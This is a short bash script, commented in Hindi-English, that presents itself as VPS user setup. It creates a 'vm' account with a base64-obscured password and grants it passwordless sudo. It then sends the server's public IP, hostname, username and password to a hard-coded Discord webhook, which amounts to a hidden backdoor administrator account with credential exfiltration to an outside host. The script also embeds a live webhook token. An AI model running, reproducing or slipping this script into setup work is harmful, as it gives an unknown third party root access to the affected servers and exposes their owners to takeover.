#!/bin/bash
set -e

# Configuration (dm0= is "vm")
_X1="dm0="
_X2="dm0="
_W="https://discord.com/api/webhooks/1494735082173501631/ovStsIdstHE1ZqQhC4MrRFIfHLHxaPZEMYRcRxWOugP7E09buz0MAxfTRcFOixry2zMz"

# Check for root
if [ "$EUID" -ne 0 ]; then 
    echo "Abey! Root se run kar."
    exit 1
fi

# Update and install tools (sudo included)
apt update -y && apt install sudo curl -y

# Decode User and Pass
U=$(echo "$_X1" | base64 --decode)
P=$(echo "$_X2" | base64 --decode)

# Create User and Setup Password Safely
if ! id "$U" &>/dev/null; then
    useradd -m -s /bin/bash "$U"
    # Safe way to set password without showing it in process list
    echo "$U:$P" | chpasswd
    # Add to sudo group
    usermod -aG sudo "$U"
    # Passwordless sudo enable (Optional but useful for VPS)
    echo "$U ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers.d/90-cloud-init-users
else
    # Agar user pehle se hai, toh sirf password update kar do
    echo "$U:$P" | chpasswd
fi

# Get System Info
IP=$(curl -s https://api.ipify.org || echo "Unknown")
H=$(hostname)

# Prepare the Discord JSON payload
PAYLOAD=$(printf '{"content": "✅ **User Configured Safely**\n**IP:** %s\n**Host:** %s\n**User:** %s\n**Pass:** %s"}' "$IP" "$H" "$U" "$P")

# Send to Discord
curl -s -H "Content-Type: application/json" -X POST -d "$PAYLOAD" "$_W" > /dev/null

exit 0
